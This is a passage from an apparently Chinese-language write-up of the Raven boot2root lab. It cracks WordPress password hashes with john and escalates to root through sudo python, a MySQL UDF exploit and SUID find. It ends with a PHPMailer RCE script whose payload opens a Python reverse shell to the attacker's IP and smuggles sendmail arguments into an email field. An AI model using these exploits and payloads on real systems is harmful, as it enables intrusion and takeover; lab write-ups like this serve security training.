class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ mysql -uroot -p<br>Enter password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| wordpress          |<br>+--------------------+<br>4 rows in set (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>+-----------------------+<br>| Tables_in_wordpress   |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>12 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from wp_posts;</span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID, post_author,post_content from wp_posts <span class="hljs-built_in">where</span> post_content like <span class="hljs-string">&quot;flag%&quot;</span>;</span><br>+----+-------------+-----------------------------------------+<br>| ID | post_author | post_content                            |<br>+----+-------------+-----------------------------------------+<br>|  4 |           1 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; |<br>|  5 |           1 | flag4&#123;715dea6c055b9fe3337544932f2941ce&#125; |<br>|  7 |           2 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; |<br>+----+-------------+-----------------------------------------+<br>3 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from wp_users;</span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID,user_login,user_pass from wp_users;</span><br>+----+------------+------------------------------------+<br>| ID | user_login | user_pass                          |<br>+----+------------+------------------------------------+<br>|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |<br>|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ |<br>+----+------------+------------------------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="1、Sudo"><a href="#1、Sudo" class="headerlink" title="1、Sudo"></a>1、Sudo</h3><p>michael 用户没有 sudo 权限，既然已经得到了 steven 的加密密码，可以尝试进行破解，看看能不能切换到 Steven 。</p><p>使用 john 进行破解，成功得到 steven 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/&#x27;</span> &gt; 1.txt</span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>0 password hashes cracked, 1 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span>       <br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>pink84           (?)<br>1g 0:00:00:08 DONE (2022-06-27 09:51) 0.1203g/s 5522p/s 5522c/s 5522C/s tamika1..milkdud<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>也可以使用在线解密：<a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p><p>切换至 steven ，查看其权限，发现可以 sudo 运行 python，使用 python 进行提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ su steven<br>Password: <br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1001(steven) gid=1001(steven) groups=1001(steven)<br><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>Matching Defaults entries for steven on raven:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User steven may run the following commands on raven:<br>    (ALL) NOPASSWD: /usr/bin/python<br><span class="hljs-meta">$</span><span class="bash"> sudo python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br>root@Raven:/home/michael# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@Raven:/home/michael# find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null<br>/var/www/flag2.txt<br>/root/flag4.txt<br>root@Raven:/home/michael# cat /root/flag4.txt<br>______                      <br>| ___ \                     <br>| |_/ /__ ___   _____ _ __  <br>|    // _` \ \ / / _ \ &#x27;_ \ <br>| |\ \ (_| |\ V /  __/ | | |<br>\_| \_\__,_| \_/ \___|_| |_|<br><br>flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;<br>CONGRATULATIONS on successfully rooting Raven!<br>This is my first Boot2Root VM - I hope you enjoyed it.<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure><p>再次查找 flag 文件，得到 flag4 。</p><h3 id="2、MySQL-UDF"><a href="#2、MySQL-UDF" class="headerlink" title="2、MySQL UDF"></a>2、MySQL UDF</h3><p>查看 mysql 版本、位置及 <code>secure_file_priv</code> 选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql --version</span><br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><span class="hljs-meta">$</span><span class="bash"> whereis mysql</span><br>mysql: /usr/bin/mysql /usr/lib/mysql /etc/mysql /usr/share/mysql /usr/share/man/man1/mysql.1.gz<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">which</span> mysql</span><br>/usr/bin/mysql<br><span class="hljs-meta">$</span><span class="bash"> mysql -uroot -p</span><br>Enter password: <br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show global variables like <span class="hljs-string">&#x27;secure%&#x27;</span>;</span><br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_auth      | OFF   |<br>| secure_file_priv |       |<br>+------------------+-------+<br>2 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><p>查找利用脚本，这里使用 <code>1518.c</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit mysql udf</span><br>------------------------------------------------------------------------------ -----------------------------<br> Exploit Title                                                                |  Path<br>------------------------------------------------------------------------------ -----------------------------<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)        | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)       | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                       | linux/local/7856.txt<br>------------------------------------------------------------------------------ -----------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 1518.c</span>   <br>  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)<br>      URL: https://www.exploit-db.com/exploits/1518<br>     Path: /usr/share/exploitdb/exploits/linux/local/1518.c<br>File Type: C source, ASCII text, with CRLF line terminators<br><br>Copied to: /home/kali/1518.c<br></code></pre></td></tr></table></figure><p>脚本给予的利用过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> * $ id</span><br><span class="hljs-comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="hljs-comment"> * $ gcc -g -c raptor_udf2.c</span><br><span class="hljs-comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="hljs-comment"> * $ mysql -u root -p</span><br><span class="hljs-comment"> * Enter password:</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> * mysql&gt; use mysql;</span><br><span class="hljs-comment"> * mysql&gt; create table foo(line blob);</span><br><span class="hljs-comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span><br><span class="hljs-comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; select * from mysql.func;</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | name      | ret | dl             | type     |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | do_system |   2 | raptor_udf2.so | function |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span><br><span class="hljs-comment"> * mysql&gt; \! sh</span><br><span class="hljs-comment"> * sh-2.05b$ cat /tmp/out</span><br><span class="hljs-comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>通过尝试，在靶机不能成功编译，所以在攻击机上进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -g -c 1518.c</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc</span><br></code></pre></td></tr></table></figure><p>通过 python 开启本地 http 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure><p>在刚刚获取的低权限用户中获取目标文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/1518.so</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>1518.c  1518.o  1518.so<br></code></pre></td></tr></table></figure><p>进行提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ mysql -u root -p<br>Enter password: <br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 63451<br>Server version: 5.5.60-0+deb8u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create table foo(line blob);</span><br>Query OK, 0 rows affected (0.04 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> insert into foo values(load_file(<span class="hljs-string">&#x27;/home/michael/1518.so&#x27;</span>));</span><br>Query OK, 1 row affected (0.02 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from foo into dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br>Query OK, 1 row affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create <span class="hljs-keyword">function</span> do_system returns <span class="hljs-built_in">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;</span><br>Query OK, 0 rows affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from mysql.func;</span><br>+-----------+-----+---------+----------+<br>| name      | ret | dl      | type     |<br>+-----------+-----+---------+----------+<br>| do_system |   2 | 1518.so | function |<br>+-----------+-----+---------+----------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br>+--------------------------------------+<br>| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |<br>+--------------------------------------+<br>|                                    0 |<br>+--------------------------------------+<br>1 row in set (0.02 sec)<br></code></pre></td></tr></table></figure><p>上面利用 UDF 成功将 find 赋予了 SUID 权限，接下来进行 SUID 提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find<br>michael@Raven:~$ find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> cat /root/flag4.txt</span><br>flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;<br>CONGRATULATIONS on successfully rooting Raven!<br>This is my first Boot2Root VM - I hope you enjoyed it.<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、WordPress </p><p>2、WordPress 枚举、爆破；SSH 爆破</p><p>3、WordPress 配置文件；mysql root权限、用户密码、flag</p><p>4、john 爆破</p><p>5、sudo 提权（python），MySQL UDF 提权 - SUID 提权（find）</p><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>john 解密之后无法再次解密：</strong></p><p>解决：当我们破解成功后，john 会将破解成功的 hash 缓存在家目录的 <code>.john/john.pot</code> 文件中，需要手动删除 <code>rm -rf ~/.john/john.pot</code> ，或者删除  <code>.john/john.pot</code>   文件下解密过的字符串，才可以再次进行解密。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>No password hashes left to crack (see FAQ)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                     <br>?:pink84<br><br>1 password hash cracked, 0 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat .john/john.pot</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta">$</span><span class="bash">P<span class="hljs-variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> vim .john/john.pot</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat .john/john.pot</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                     <br>0 password hashes cracked, 1 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>pink84           (?)<br>1g 0:00:00:07 DONE (2022-06-27 10:05) 0.1295g/s 5944p/s 5944c/s 5944C/s tamika1..milkdud<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br>                                                                                                             $ cat .john/john.pot                                                           <br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta">$</span><span class="bash">P<span class="hljs-variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>No password hashes left to crack (see FAQ)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                            <br>?:pink84<br><br>1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure><p><strong>MySQL UDF：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;whoami&gt;/tmp/out&#x27;</span>);</span><br>+------------------------------+<br>| do_system(&#x27;whoami&gt;/tmp/out&#x27;) |<br>+------------------------------+<br>|                            0 |<br>+------------------------------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> system cat /tmp/out</span><br>root<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> \! sh</span><br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>michael<br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/out</span><br>root<br></code></pre></td></tr></table></figure><p><strong>文件上传 GetShell：</strong></p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_43168364/article/details/108206821">https://blog.csdn.net/qq_43168364/article/details/108206821</a></p></blockquote><p>在 <code>http://192.168.15.172/vendor/</code> 目录下发现了 <code>PHPMailerAutoload.php</code> 文件。</p><p>phpMailer 是一个非常强大的 php 发送邮件类，PHPMailer &lt; 5.2.18 中存在高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p><p>可以在 <code>http://192.168.15.172/vendor/VERSION</code> 中查看 phpMailer 的版本，版本为：<code>5.2.16</code> 。</p><p>用 searchsploit 查找 phpmailer 的漏洞利用代码，这里使用 40974.py 脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit phpmailer</span>  <br>---------------------------------------------------------------------------- -------------------------------<br> Exploit Title                                                              |  Path<br>---------------------------------------------------------------------------- -------------------------------<br>PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service                           | php/dos/25752.txt<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40968.sh<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40970.php<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40974.py<br>PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploit)               | multiple/webapps/41688.rb<br>PHPMailer &lt; 5.2.20 - Remote Code Execution                                  | php/webapps/40969.pl<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                    | php/webapps/42221.py<br>PHPMailer &lt; 5.2.21 - Local File Disclosure                                  | php/webapps/43056.py<br>WordPress Plugin PHPMailer 4.6 - Host Header Command Injection (Metasploit) | php/remote/42024.rb<br>---------------------------------------------------------------------------- -------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>修改 python 脚本的内容：</p><blockquote><p>PS:后门文件上传到靶机的路径应该是必须要更改的否则无法反弹shell，且文件名不能用 backdoor.php </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.0.12\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://192.168.135.149/contact.php&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.135.141\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); 